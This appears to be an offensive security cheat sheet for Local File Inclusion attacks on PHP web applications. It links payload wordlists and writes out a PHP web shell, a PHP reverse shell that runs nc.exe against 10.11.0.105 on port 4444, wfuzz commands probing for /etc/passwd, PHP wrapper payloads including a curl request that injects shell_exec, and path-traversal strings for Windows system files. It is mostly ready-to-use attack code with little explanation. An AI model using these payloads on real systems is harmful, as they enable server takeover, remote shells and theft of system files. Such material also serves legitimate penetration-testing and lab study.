- - -
### 🐶️ **Wordlists** **:**

- [LFI-Payload-List](https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt)
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
- - -

### 🐯️ **System files Wordlists** **:** **(** Both Win/Linux **)**

- [Sirensecurity.io](https://sirensecurity.io/blog/file-inclusion-reference/)

- - -
### Useful Payloads : 

```php
<?php echo shell_exec($_GET['cmd']);?>
```

```php
<?php
echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe")
?>
```


- - -
## Fuzzing :

##### **<u>Finding Parameters Name</u> :**
```sh
wfuzz -u http://10.10.10.10/image.php?FUZZ=/etc/passwd -c -w /opt/seclists/Discovery/Web-Content/api/objects.txt
``` 


##### **<u>Finding Files</u> :**

```sh
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 "$URL/index.php?id=FUZZ"
```


- - -

## PHP Wrappers 🎁 🎁 🎁 

##### **<u>Wrapper php://filter</u>**

```php
php://filter/convert.base64-encode/resource=
```

##### **<u>Wrapper expect://</u>**

```php
expect://id
```

##### **<u>Wrapper input://</u>**

```bash
curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"
```

- - -
### Common Windows Files : 

**Accessible By  Everyone :**
```sh
file=C:\windows\system32\drivers\etc\hosts

file=../../../../../boot.ini
```

- - -
